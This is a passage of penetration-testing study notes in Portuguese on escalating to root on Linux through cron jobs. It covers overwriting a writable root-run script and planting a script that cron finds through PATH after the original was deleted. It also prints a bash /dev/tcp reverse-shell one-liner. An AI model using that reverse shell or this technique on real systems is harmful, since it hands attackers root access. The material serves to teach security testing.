Os Cron Jobs são usados para executar scripts ou binários em horários específicos. Por padrão, eles são executados com o privilégio de seus proprietários e não do usuário atual. Embora os cron jobs configurados corretamente não sejam inerentemente vulneráveis, eles podem fornecer um vetor de escalonamento de privilégios em algumas condições.

A ideia é bem simples: ==se houver uma tarefa agendada que seja executada com privilégios de root e pudermos alterar o script que será executado, então nosso script será executado com privilégios de root.==

![[Pasted image 20231220211609.png]]

Você pode ver que o script backup.sh foi configurado para ser executado a cada minuto. O conteúdo do arquivo mostra um script simples que cria um backup do arquivo prices.xls.

![[Pasted image 20231220211629.png]]

Como o nosso usuário atual pode acessar esse script, podemos modificá-lo facilmente para criar um shell reverso, com privilégios de root.

O script usará as ferramentas disponíveis no sistema de destino para iniciar um shell reverso.
Dois pontos a serem observados;

1. Sintaxe do comando varia de acordo com as ferramentas disponíveis. (por exemplo, o nc provavelmente não suportará a opção -e que você pode ter visto ser usada em outros casos)
2. Sempre devemos preferir iniciar shells reversos, pois não queremos comprometer a integridade do sistema durante um compromisso real de teste de penetração.

O arquivo deve ter a seguinte aparência;

![[Pasted image 20231220211700.png]]

```shell
#!/bin/bash

bash -i >& /dev/tcp/10.2.2.15/6666 0>&1
```

Agora, executaremos um listener em nossa máquina de ataque para receber a conexão de entrada.

![[Pasted image 20231220211714.png]]

Sempre vale a pena verificar o Crontab, pois às vezes ele pode levar a vetores fáceis de escalonamento de privilégios. O cenário a seguir não é incomum em empresas que não têm um determinado nível de maturidade de segurança cibernética:

1. Os administradores de sistema precisam executar um script em intervalos regulares.
2. Eles criam um trabalho cron para fazer isso
3. Depois de algum tempo, o script se torna inútil e eles o excluem
4. Eles não limpam o trabalho cron relevante

Esse problema de gerenciamento de alterações leva a uma possível exploração que aproveita os trabalhos do cron.

![[Pasted image 20231220211753.png]]

O exemplo acima mostra uma situação semelhante em que o script antivírus.sh foi excluído, mas o trabalho do cron ainda existe.
Se o caminho completo do script não for definido (como foi feito para o script backup.sh), o cron fará referência aos caminhos listados na variável PATH no arquivo /etc/crontab. Nesse caso, devemos ser capazes de criar um script chamado "antivirus.sh" na pasta home do nosso usuário e ele deve ser executado pelo trabalho do cron.

O arquivo no sistema de destino deve ter uma aparência familiar:

![[Pasted image 20231220211812.png]]

A conexão de entrada do reverse shell tem privilégios de root:

![[Pasted image 20231220211828.png]]

Na eventualidade de encontrar um script ou tarefa existente anexado a um trabalho cron, sempre vale a pena dedicar algum tempo para entender a função do script e como qualquer ferramenta é usada dentro do contexto. Por exemplo, tar, 7z, rsync, etc., podem ser explorados usando seu recurso curinga.

